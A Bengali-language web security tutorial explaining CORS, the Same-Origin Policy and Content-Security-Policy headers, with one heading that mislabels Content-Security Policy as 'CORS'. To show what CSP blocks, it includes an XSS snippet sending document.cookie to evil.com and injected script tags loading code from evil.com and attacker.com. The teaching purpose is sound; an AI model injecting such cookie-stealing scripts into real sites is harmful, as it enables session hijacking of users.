# CORS, CSP, SOP

# Content-Security Policy (CORS) কী?

CORS (Cross-Origin Resource Sharing) হলো ওয়েব সিকিউরিটির একটা সিস্টেম, যা ব্রাউজার (যেমন Chrome বা Firefox) ব্যবহার করে। এটা নিয়ন্ত্রণ করে যে একটা ওয়েবসাইট অন্য ওয়েবসাইটের রিসোর্স (যেমন ডেটা, ইমেজ বা API) অ্যাক্সেস করতে পারবে কি না। সহজ কথায়, এটা একটা "অনুমতি চেক" যাতে ওয়েবসাইটগুলো নিরাপদ থাকে এবং চুরি বা অ্যাটাক না হয়।

### বেসিক আইডিয়া: Same-Origin Policy

- ব্রাউজারের ডিফল্ট রুল হলো "Same-Origin Policy": একটা ওয়েবসাইট শুধু তার নিজের ডোমেইনের (যেমন example.com) রিসোর্স অ্যাক্সেস করতে পারবে। যদি অন্য ডোমেইন (যেমন api.anothersite.com) থেকে ডেটা চাই, তাহলে ব্রাউজার ব্লক করে দেবে। এটা সিকিউরিটির জন্য ভালো, কারণ না হলে কোনো ম্যালিশাস সাইট তোমার লগইন ডেটা চুরি করতে পারত।
- কিন্তু আধুনিক ওয়েবে এটা প্রবলেম, কারণ অনেক অ্যাপ (যেমন ফ্রন্টএন্ড React অ্যাপ) অন্য সার্ভারের API থেকে ডেটা লোড করে। তাই CORS এসেছে – এটা সার্ভারকে বলতে দেয়, "হ্যাঁ, এই সাইটকে অনুমতি দাও"।

### CORS কীভাবে কাজ করে?

একটা ওয়েবসাইট আরেকটা ওয়েবসাইট থেকে ডাটা নিতে চাইলে ব্রাউজার আগে জিজ্ঞেস করে:
“তুমি কি তাকে ডাটা নিতে দেবে?”

এই “হ্যাঁ/না” বলাটাই হলো CORS।

ধরো দুইটা সাইট আছে:

- **siteA.com** → তুমি এখানে বসে আছো।
- **siteB.com** → তোমার দরকার এখানকার ডাটা।

তুমি siteA থেকে JavaScript দিয়ে লেখলে:

```jsx
fetch("https://api.siteB.com/users")
  .then(res => res.json())
  .then(data => console.log(data));
```

এখন ব্রাউজার siteB.com কে জিজ্ঞেস করে:

**“siteA.com কি তোমার ডাটা নিতে পারবে?”**

যদি siteB.com এর উত্তর হয় “হ্যাঁ”। তাহলে সে তার রেসপন্সে লিখে দেয়:

```
Access-Control-Allow-Origin: https://siteA.com
Access-Control-Allow-Methods: GET, POST
```

**মানে**: **“হ্যাঁ, siteA.com আমার ডাটা নিতে পারবে।”** তারপর তুমি ডাটা পেয়ে যাবে।

siteB.com যদি অনুমতি না দেয়, ব্রাউজার সরাসরি ব্লক করে দেবে। তখন তুমি শুধু একটা error দেখবে:

**“CORS error”**

এটুকুই।

---

# Same-Origin Policy (SOP) কী?

**এটা ব্রাউজারের নিরাপত্তা নিয়ম।
যে নিয়ম বলে: এক ওয়েবসাইট আরেক ওয়েবসাইটের ডাটা নাড়াচাড়া করতে পারবে না, যদি দু’টোর “origin” আলাদা হয়।**

Origin = **scheme + domain + port**

(এই তিনটা মিললে তবেই same-origin)

---

ব্রাউজারে তোমার Cookie, token, session খুব সেনসিটিভ জিনিস।

কোনো র‌্যান্ডম ওয়েবসাইট যেন তোমার ব্যাংক বা ইমেইল সাইটের ডাটা পড়ে ফেলতে না পারে, তাই **Same Origin Policy**।

ধরো তুমি ব্রাউজারে দুইটা ট্যাব খুলেছ:

1. **https://bank.com**
2. **https://evil.com**

ধরো evil.com এর ভিতরে JavaScript আছে। সে চায় bank.com এর ডাটা পড়তে (GET):

```jsx
document.location = "https://bank.com/account";
```

বা:

```jsx
fetch("https://bank.com/account");
```

SOP এখানে বলে: **“থামো, তোমরা দুইজন আলাদা origin।
তুমি bank.com এর ডাটা দেখতে বা পড়তে পারবে না।”**

এটা না থাকলে, যেকোনো ম্যালিসিয়াস সাইট তোমার ব্যাংকের ডাটা লুটে নিতে পারত কিংবা দেখতে পারতো।

- **SOP = ব্রাউজারের লক সিস্টেম**
- **এক origin → অন্য origin-এর ডাটা পড়তে পারবে না**
- এটা ওয়েবের সবচেয়ে বেসিক ও শক্তিশালী Security Rule
- CORS মূলত SOP কে bypass করার “নিয়ন্ত্রিত Permission সিস্টেম”

---

# CSP (Content-Security Policy) কী?

**CSP হলো ওয়েবসাইটের “কি চলবে, কি চলবে না”—এই লিস্ট।**

মানে সাইট নিজে ঘোষণা করে দেয়:

- আমার সাইটে কোন স্ক্রিপ্ট লোড হতে পারবে
- কোন ডোমেইন থেকে ছবি/JS/CSS আসতে পারবে
- Inline script চলবে কি চলবে না
- Eval চলবে কি চলবে না

এটা মূলত XSS ঠেকানোর জন্য।

ধরো তোমার সাইটে একজন attacker নিচের মতো JS inject করল:

```html
<script>
  fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>

```

এই স্ক্রিপ্ট যদি চলতে পারে → কুকি চলে যাবে। এটাই XSS।

**এখন CSP বলে:** “**স্ক্রিপ্ট কই থেকে লোড হবে, আমি ঠিক করে দেবো যদি অনুমোদন না থাকে, ব্রাউজার স্ক্রিপ্ট চালাবে না।”**

ধরো তুমি তোমার সাইটে CSP সেট করলা:

```
Content-Security-Policy: script-src 'self';
```

এর মানে: **“শুধু আমার নিজের ডোমেইন থেকে আসা জাভাস্ক্রিপ্টই চলবে। বাইরের কোন স্ক্রিপ্ট চলবে না।”**

এবার যদি attacker এই script Browser এ কোনো input field এ ঢোকায়:

```html
<script src="https://evil.com/x.js"></script>
```

ব্রাউজার সরাসরি বলবে: **“না, CSP allow করে নাই।”** সুতরাং script রান করবে না।

আরেকটা উদাহরণ দিলে: ধরো তুমি একটু তোমার site permissive CSP দিলা:

```
Content-Security-Policy: script-src 'self' https://cdn.example.com;
```

এর মানে:

- নিজের সাইটের JS Allow
- cdn.example.com থেকেও JS Allow
- অন্যসব Disallow

এখন attacker inject করলো:

```html
<script src="https://attacker.com/hack.js"></script>
```

ব্রাউজার বলবে: **“এই ডোমেইন আমার whitelist-এ নাই so ব্লক।”**

---

**CSP হলো ওয়েবসাইটের সিকিউরিটি রুলবুক—কোন কন্টেন্ট কোথা থেকে লোড হতে পারবে সেটা ডিক্লেয়ার করে, আর ব্রাউজার সেটা এনফোর্স করে।**

---
